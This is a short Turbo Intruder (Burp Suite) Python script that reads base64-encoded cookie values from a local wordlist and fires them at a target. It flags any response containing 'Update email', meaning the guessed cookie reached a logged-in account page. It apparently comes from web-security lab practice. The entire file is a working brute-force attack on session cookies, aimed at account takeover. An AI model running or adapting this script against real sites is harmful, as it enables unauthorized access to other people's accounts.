def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for word in open('C:/Users/filippo/Desktop/cs tools/cookieB64.txt'):
        engine.queue(target.req, word.rstrip())


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    data = req.response.encode('utf8')
    header, _, body = data.partition('\r\n\r\n')
    if "Update email" in body:
        table.add(req)
